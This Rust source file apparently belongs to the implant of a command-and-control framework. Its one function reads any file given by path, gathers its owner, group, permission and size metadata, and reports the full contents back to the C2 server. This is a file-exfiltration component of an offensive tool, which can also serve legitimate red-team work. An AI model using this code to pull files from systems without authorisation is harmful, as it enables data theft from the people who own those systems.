use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::Agent;
use pb::{c2, eldritch};

#[cfg(feature = "stdlib")]
use eldritch_libfile::std::file_metadata::get_file_info;

pub fn file(agent: Arc<dyn Agent>, task_id: i64, path: String) -> Result<(), String> {
    let content = std::fs::read(&path).map_err(|e| e.to_string())?;

    #[cfg(feature = "stdlib")]
    let metadata = {
        let info = get_file_info(std::path::Path::new(&path)).map_err(|e| e.to_string())?;
        eldritch::FileMetadata {
            path: path.clone(),
            owner: info.owner,
            group: info.group,
            permissions: info.permissions,
            size: info.size,
            // We can also calculate sha3_256 if needed, but it's not requested by the user explicitly,
            // and might be expensive. The user just asked for permissions, owner, group.
            ..Default::default()
        }
    };

    #[cfg(not(feature = "stdlib"))]
    let metadata = eldritch::FileMetadata {
        path: path.clone(),
        ..Default::default()
    };

    let file_msg = eldritch::File {
        metadata: Some(metadata),
        chunk: content,
    };

    let req = c2::ReportFileRequest {
        task_id,
        chunk: Some(file_msg),
    };

    agent.report_file(req).map(|_| ())
}
